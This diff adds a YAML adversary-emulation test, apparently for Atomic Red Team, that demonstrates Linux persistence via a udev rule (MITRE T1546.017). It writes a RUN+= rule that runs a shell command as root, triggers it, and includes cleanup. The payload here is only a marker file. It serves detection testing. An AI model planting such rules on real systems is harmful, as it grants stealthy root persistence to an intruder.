@@ -1,0 +1,51 @@
+attack_technique: T1546.017
+display_name: 'Event Triggered Execution: Udev Rules'
+atomic_tests:
+- name: Persistence via Udev Rule RUN+= Action
+  auto_generated_guid: 9de07d08-c099-4da7-a9f8-3ab4a626b764
+  description: |
+    Establishes persistence by writing a udev rule with a `RUN+=` action to `/etc/udev/rules.d/`.
+    The rule matches the always-present `/dev/null` device (`SUBSYSTEM=="mem", KERNEL=="null"`) on an
+    `add` event, so reloading the udev rules and re-triggering the device causes systemd-udevd to run
+    the payload as root. The payload writes the current user context to a marker file to demonstrate
+    execution. This mirrors the in-the-wild `sedexp` malware, which abused udev rules for stealthy
+    persistence. Requires a running systemd-udevd, which is standard on Linux.
+    See https://www.levelblue.com/blogs/spiderlabs-blog/unveiling-sedexp
+  supported_platforms:
+  - linux
+  input_arguments:
+    rule_file:
+      description: Path to the udev rule file that is created
+      type: path
+      default: /etc/udev/rules.d/70-art-udev-persistence.rules
+    marker_file:
+      description: Marker file written by the udev RUN+= payload to demonstrate execution
+      type: path
+      default: /tmp/art-udev-persistence.txt
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      udevadm (systemd-udev) must be installed and systemd-udevd must be running.
+    prereq_command: |
+      if [ -x "$(command -v udevadm)" ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      echo "Install udev (systemd-udev) and ensure the systemd-udevd service is running."; exit 1
+  executor:
+    command: |
+      mkdir -p "$(dirname #{rule_file})"
+      cat > "#{rule_file}" <<'EOF'
+      ACTION=="add", SUBSYSTEM=="mem", KERNEL=="null", RUN+="/bin/sh -c 'id > #{marker_file} 2>&1'"
+      EOF
+      udevadm control --reload-rules
+      udevadm trigger --action=add --subsystem-match=mem --sysname-match=null
+      udevadm settle
+      echo "Udev rule installed at #{rule_file}:"
+      cat "#{rule_file}"
+      echo "Marker file (proves the RUN+= payload executed):"
+      cat "#{marker_file}" 2>/dev/null || echo "Marker not created - is systemd-udevd running?"
+    cleanup_command: |
+      rm -f "#{rule_file}"
+      rm -f "#{marker_file}"
+      udevadm control --reload-rules 2>/dev/null
+    name: bash
+    elevation_required: true
